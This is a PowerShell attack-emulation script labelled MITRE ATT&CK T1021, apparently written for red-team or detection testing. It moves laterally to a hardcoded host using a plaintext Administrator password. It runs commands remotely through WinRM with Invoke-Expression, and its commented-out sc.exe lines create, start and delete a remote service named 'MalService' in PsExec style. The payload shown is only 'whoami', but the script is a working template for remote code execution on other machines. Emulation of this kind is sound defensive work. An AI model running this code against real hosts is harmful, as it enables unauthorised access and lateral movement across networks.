<#
    Technique ID: T1021
    Name: Remote Services: SMB/Windows Admin Shares & WinRM
    Tactic: Lateral Movement
    Platform: Windows
    Severity: High
    Description: Moving laterally to another host using PsExec-style service creation or WinRM.
    Source: MITRE ATT&CK v16.1 / Book: "Violent Python" (Concept adapted to PS)
#>

Write-Host "[*] Executing T1021: Lateral Movement" -ForegroundColor Cyan

$target = "192.168.1.20"
$username = "Administrator"
$password = "SecurePass123!"
$command = "whoami"

$secPass = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($username, $secPass)

# 1. WinRM (T1021.006) - Cleaner, built-in
# Requires Enable-PSRemoting on target.
Write-Host "[*] Attempting WinRM Connection to $target..."
try {
    Invoke-Command -ComputerName $target -Credential $cred -ScriptBlock { 
        param($cmd)
        Write-Host "Running on $env:COMPUTERNAME"
        Invoke-Expression $cmd
    } -ArgumentList $command
    Write-Host "[+] WinRM Execution Successful."
} catch {
    Write-Warning "[-] WinRM Failed. Ports 5985/5986 closed?"
}

# 2. SMB / Service Creation (T1021.002) - "PsExec" Style
# Requires Admin Shares (C$, ADMIN$).
Write-Host "[*] Attempting Service Creation (SC Manager)..."
# sc.exe \\$target create MalService binPath= "C:\Windows\System32\cmd.exe /c $command"
# sc.exe \\$target start MalService
# sc.exe \\$target delete MalService
